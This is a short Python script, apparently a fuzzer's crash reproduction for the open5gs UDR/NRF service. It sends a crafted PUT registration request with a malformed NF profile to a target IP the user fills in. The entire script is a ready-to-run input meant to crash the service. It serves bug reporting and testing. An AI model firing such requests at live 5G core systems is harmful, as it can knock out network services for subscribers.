#!/usr/bin/env python3
# Crash reproduction for open5gs-udr (info)
# Detected: Sat May  9 06:17:01 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/UDM-fuzz-7052'
body = b'{"nfInstanceId": "_FUZZ", "nfType": "AMF", "nfStatus": "REGISTERED", "ipv4Addresses": ["172.23.0.20"], "fqdn": "amf.open5gs.local", "priority": 1, "capacity": 200, "load": 0, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.23.0.20", "port": 7777}]}], "supi": "imsi-901700000000001"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
